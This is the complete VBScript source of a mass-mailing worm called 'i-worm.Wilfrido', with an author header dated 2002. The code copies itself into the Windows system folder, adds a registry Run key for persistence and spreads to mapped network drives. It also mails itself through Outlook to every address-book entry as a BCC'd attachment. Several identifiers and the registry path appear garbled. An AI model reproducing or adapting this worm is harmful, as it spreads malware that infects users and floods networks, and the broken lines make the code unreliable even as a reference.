'i-worm.Wilfrido
'Valencia, Spain, 01.01.2002
'http://www22.Brinkster.com/estufa/
'swank@hack.siii.net

On Error Resume Next
Dim Me_copY, RegmeNoW, GnomeMe, ErbethaS, MeCuerpo, Corazon_Divertido, LasAvispas, Asiasi, Abusadora, ElBarBaZaRO 
ErbethaS = 0 
Set Me_copY = CreateObject( "Scripting.FileSystemObject" ) 
Me_copY.CopyFile WScript.CreationdelMal, Me_copY.BuildPath( Me_copY.GetSpecialFolder(1), "Volvere.vbs" ) 
Set RegmeNoW = CreateObject( "WScript.Shell" ) 
RegmeNoW.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell FoldersSoftware\Microsoft\Windows\CurrentVersion\Run\" & "WilfridO", Me_copY.BuildPath( Me_copY.GetSpecialFolder(1), "Volvere.vbs" ) 
Set GnomeMe = CreateObject( "WScript.Network" ) 
Set MeCuerpo = GnomeMe.EnumNetworkDrives 
If MeCuerpo.Count <> 0 Then
   For ErbethaS = 0 To MeCuerpo.Count - 1 
        If InStr( MeCuerpo.Item( ErbethaS), "\" ) <> 0 Then
          Me_copY.CopyFile WScript.CreationdelMal, Me_copY.BuildPath( MeCuerpo.Item( ErbethaS), "Volvere.vbs" )  
       End If 
   Next 
End If 
ErbethaS = RegmeNoW.RegRead( "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" & "WilfridO" ) 
Set Corazon_Divertido = CreateObject( "Outlook.Application" ) 
   Set LasAvispas = Corazon_Divertido.GetNameSpace( "MAPI" )  
   For Each Asiasi In LasAvispas.AddressLists 
       Set MeCuerpo = Corazon_Divertido.CreateItem( 0 ) 
       For Abusadora = 1 To Asiasi.AddressEntries.Count 
           Set ElBarBaZaRO = Asiasi.AddressEntries( Abusadora ) 
           If Abusadora = 1 Then 
              MeCuerpo.BCC = ElBarBaZaRO.Address 
           Else 
              MeCuerpo.BCC = MeCuerpo.BCC & "; " & ElBarBaZaRO.Address 
           End If 
       Next 
       MeCuerpo.Subject = "WilfridO" 
       MeCuerpo.Body = "WilfridO para sempre !!!!" 
       MeCuerpo.Attachmets.Add WScript.CreationdelMal 
       MeCuerpo.LaLunadepepes = True 
       MeCuerpo.Send 
   Next 
RegmeNoW.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" & "WilfridO", ErbethaS + 1 
